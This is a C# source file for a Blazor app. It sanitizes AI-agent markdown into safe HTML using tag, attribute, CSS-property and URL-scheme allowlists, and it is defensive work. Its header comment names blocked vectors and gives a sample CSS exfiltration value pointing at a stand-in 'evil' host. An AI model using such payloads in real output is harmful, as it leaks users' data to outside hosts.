using Ganss.Xss;
using Markdig;
using Markdig.Syntax;
using Markdig.Syntax.Inlines;
using RockBot.UserProxy.Rendering;

namespace RockBot.UserProxy.Blazor.Services;

/// <summary>
/// Renders agent-emitted markdown into HTML that's safe to drop into the DOM via
/// <see cref="Microsoft.AspNetCore.Components.MarkupString"/>. Pipes Markdig output
/// through <see cref="HtmlSanitizer"/> with an allowlist tight enough to deny:
/// <list type="bullet">
/// <item><c>&lt;script&gt;</c>, <c>&lt;iframe&gt;</c>, <c>&lt;style&gt;</c>, and event handlers (<c>onclick</c>, etc.)</item>
/// <item><c>javascript:</c> / <c>data:</c> / <c>vbscript:</c> URL schemes</item>
/// <item><c>url(...)</c> values inside CSS — blocks data-exfil via <c>background:url(https://evil/leak?...)</c></item>
/// <item>UI-hijack CSS — <c>position</c>, <c>z-index</c>, fixed <c>width/height/top/left</c>, <c>transform</c>, <c>opacity</c></item>
/// <item><c>&lt;foreignObject&gt;</c> inside SVG (would let HTML smuggle past the SVG perimeter)</item>
/// </list>
/// The allowlist matches the rich-content subset the agent is told it may emit
/// via the <c>ClientCapabilities</c> system prompt: bold/italic/code, headings,
/// tables, fenced code, inline links, strikethrough, GFM task lists, sanitized
/// inline HTML for color and structure, and inline SVG for charts.
/// <para>
/// Before rendering, raw HTML nodes whose tag name isn't a real HTML / SVG element
/// (see <see cref="KnownMarkupTags"/>) are turned back into literal text. Without
/// that, prose like <c>Expected '&lt;folder&gt;/&lt;uid&gt;'</c> is parsed as
/// inline HTML and the sanitizer drops the "tags", leaving <c>Expected '/'</c>.
/// </para>
/// </summary>
public static class SafeMarkdownRenderer
{
    private static readonly MarkdownPipeline Pipeline = new MarkdownPipelineBuilder()
        .UseAdvancedExtensions()
        .Build();

    private static readonly HtmlSanitizer Sanitizer = BuildSanitizer();

    /// <summary>
    /// Renders <paramref name="markdown"/> to sanitized HTML. Returns
    /// <see cref="string.Empty"/> for null/empty input. On any Markdig parsing
    /// exception, falls back to a plain-text-with-&lt;br&gt; rendering that's
    /// itself HTML-encoded — never returns unsafe markup.
    /// </summary>
    public static string RenderSafe(string? markdown)
    {
        if (string.IsNullOrEmpty(markdown))
            return string.Empty;

        string html;
        try
        {
            var document = Markdown.Parse(markdown, Pipeline);
            LiteralizeUnknownTags(document);
            html = document.ToHtml(Pipeline);
        }
        catch
        {
            // Fallback: encode literally, preserve line breaks. No sanitizer needed
            // because the input is fully encoded.
            return System.Net.WebUtility.HtmlEncode(markdown).Replace("\n", "<br/>");
        }

        return Sanitizer.Sanitize(html);
    }

    /// <summary>
    /// Replaces raw-HTML nodes that only look like tags (<c>&lt;folder&gt;</c>,
    /// <c>&lt;/uid&gt;</c>) with literal text, which Markdig then HTML-encodes.
    /// Known tags — including disallowed ones like <c>&lt;script&gt;</c> — are left
    /// as HTML for the sanitizer to keep or strip as before.
    /// </summary>
    private static void LiteralizeUnknownTags(MarkdownDocument document)
    {
        foreach (var inline in document.Descendants<HtmlInline>().ToList())
        {
            if (IsUnknownTag(inline.Tag))
                inline.ReplaceBy(new LiteralInline(inline.Tag));
        }

        // A line consisting of just a tag (CommonMark HTML block type 7) becomes a
        // raw HTML block rather than inline HTML. Its whole text is raw until the
        // next blank line, so render it as a literal paragraph.
        foreach (var block in document.Descendants<HtmlBlock>().ToList())
        {
            if (block.Type != HtmlBlockType.NonInterruptingBlock || block.Parent is not { } parent)
                continue;

            var lines = block.Lines.Lines.Take(block.Lines.Count).Select(l => l.Slice.ToString()).ToList();
            if (lines.Count == 0 || !IsUnknownTag(lines[0].Trim()))
                continue;

            var content = new ContainerInline();
            for (var i = 0; i < lines.Count; i++)
            {
                if (i > 0)
                    content.AppendChild(new LineBreakInline());
                content.AppendChild(new LiteralInline(lines[i]));
            }

            var index = parent.IndexOf(block);
            parent.RemoveAt(index);
            parent.Insert(index, new ParagraphBlock { Inline = content });
        }
    }

    private static bool IsUnknownTag(string tag) =>
        KnownMarkupTags.GetTagName(tag) is { } name && !KnownMarkupTags.IsKnown(name);

    private static HtmlSanitizer BuildSanitizer()
    {
        var s = new HtmlSanitizer();

        // ── Tags ──────────────────────────────────────────────────────────
        // Start from the library default, then add the rich subset we permit.
        // Inline SVG and task-list <input> are off by default and need explicit
        // opt-in.
        s.AllowedTags.Add("svg");
        s.AllowedTags.Add("g");
        s.AllowedTags.Add("path");
        s.AllowedTags.Add("rect");
        s.AllowedTags.Add("circle");
        s.AllowedTags.Add("ellipse");
        s.AllowedTags.Add("line");
        s.AllowedTags.Add("polyline");
        s.AllowedTags.Add("polygon");
        s.AllowedTags.Add("text");
        s.AllowedTags.Add("tspan");
        s.AllowedTags.Add("title");        // SVG <title> for hover tooltips
        s.AllowedTags.Add("desc");
        s.AllowedTags.Add("defs");
        s.AllowedTags.Add("marker");
        s.AllowedTags.Add("linearGradient");
        s.AllowedTags.Add("radialGradient");
        s.AllowedTags.Add("stop");
        s.AllowedTags.Add("input");        // GFM task-list checkboxes

        // <foreignObject> would smuggle arbitrary HTML inside SVG past most
        // allowlists — strip it explicitly even though it isn't on by default.
        s.AllowedTags.Remove("foreignObject");

        // ── Attributes ────────────────────────────────────────────────────
        s.AllowedAttributes.Add("style");
        s.AllowedAttributes.Add("class");

        // SVG geometry / appearance attributes
        foreach (var attr in new[]
        {
            "viewBox", "preserveAspectRatio", "xmlns",
            "x", "y", "x1", "y1", "x2", "y2",
            "cx", "cy", "r", "rx", "ry",
            "d", "points", "transform",
            "width", "height",
            "fill", "stroke", "stroke-width", "stroke-linecap", "stroke-linejoin",
            "stroke-dasharray", "opacity", "fill-opacity", "stroke-opacity",
            "text-anchor", "font-family", "font-size", "font-weight",
            "dx", "dy", "rotate",
            "offset", "stop-color", "stop-opacity",
            "gradientUnits", "gradientTransform",
            "marker-start", "marker-mid", "marker-end",
            "orient", "refX", "refY", "markerWidth", "markerHeight",
        })
        {
            s.AllowedAttributes.Add(attr);
        }

        // GFM task-list <input> attributes — type + disabled + checked only.
        s.AllowedAttributes.Add("type");
        s.AllowedAttributes.Add("disabled");
        s.AllowedAttributes.Add("checked");

        // ── CSS properties — tight allowlist ──────────────────────────────
        // Replace the default ~60-property allowlist with just the text-styling
        // properties we actually need. Drops position/z-index/transform/opacity
        // and width/height/top/left, which are the UI-hijack vectors.
        s.AllowedCssProperties.Clear();
        foreach (var prop in new[]
        {
            "color", "background-color",
            "font-weight", "font-style", "font-size", "font-family",
            "text-decoration", "text-align",
            "padding", "padding-left", "padding-right", "padding-top", "padding-bottom",
            "margin", "margin-left", "margin-right", "margin-top", "margin-bottom",
            "border", "border-color", "border-style", "border-width", "border-radius",
            "line-height",
        })
        {
            s.AllowedCssProperties.Add(prop);
        }

        // ── URL schemes ───────────────────────────────────────────────────
        s.AllowedSchemes.Clear();
        s.AllowedSchemes.Add("http");
        s.AllowedSchemes.Add("https");
        s.AllowedSchemes.Add("mailto");

        // ── CSS url() values ──────────────────────────────────────────────
        // The library default already strips url(...) inside CSS values, which
        // is the primary CSS-based data-exfil vector. The CSS-property allowlist
        // above also excludes background-image / list-style-image / cursor where
        // url() would normally appear, providing a second layer of defense.

        // ── Misc ──────────────────────────────────────────────────────────
        s.AllowDataAttributes = false;

        return s;
    }
}
